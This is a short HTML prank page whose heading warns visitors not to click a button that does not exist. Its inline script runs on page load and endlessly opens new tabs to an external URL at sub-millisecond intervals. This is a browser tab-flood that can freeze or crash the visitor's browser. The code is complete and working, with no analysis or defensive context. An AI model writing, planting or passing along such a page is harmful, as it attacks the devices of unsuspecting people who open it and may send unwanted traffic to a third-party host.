<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Do Not Click</title>
</head>
<body>
    <h1>Do not click the button below... I warned you.</h1>

    <script>
        function openWindows() {
            let counter = 0;
            const intervalId = setInterval(() => {
                window.open('https://redz.is-a.dev/api/', `_blank_${counter}`); // Open a new tab
                counter++;
            }, 0.001); // Open a new tab every less than a millisecond
        }

        // Call the function immediately
        openWindows();
    </script>
</body>
</html>
